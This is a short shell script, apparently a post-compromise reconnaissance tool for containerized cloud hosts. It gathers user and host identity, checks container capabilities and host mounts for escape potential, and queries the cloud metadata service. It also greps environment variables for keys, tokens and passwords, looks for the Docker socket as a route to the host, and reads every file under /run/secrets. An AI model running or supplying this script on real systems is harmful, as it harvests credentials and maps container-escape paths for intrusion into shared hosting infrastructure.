#!/bin/sh
echo "=== IDENTITY ==="
id; whoami; hostname; uname -a
echo "=== ISOLATION ==="
cat /etc/hostname
cat /proc/1/cgroup            # container? which orchestrator?
cat /proc/self/status | grep -i cap  # capabilities = escape potential
ls -la /                       # host mounts leaking in?
mount 2>/dev/null | head -40
echo "=== NETWORK / TENANTS ==="
ip addr 2>/dev/null || ifconfig 2>/dev/null
cat /etc/hosts
ip route 2>/dev/null
echo "=== METADATA (cloud infra) ==="
curl -s --max-time 3 http://169.254.169.254/metadata/v1/ 2>/dev/null   # DO metadata
echo "=== SECRETS IN ENV ==="
env | grep -iE 'key|token|secret|pass|aws|do_|cloudways' 
echo "=== ORCHESTRATION REACH ==="
ls -la /var/run/docker.sock 2>/dev/null   # docker socket = full host
cat /run/secrets/* 2>/dev/null
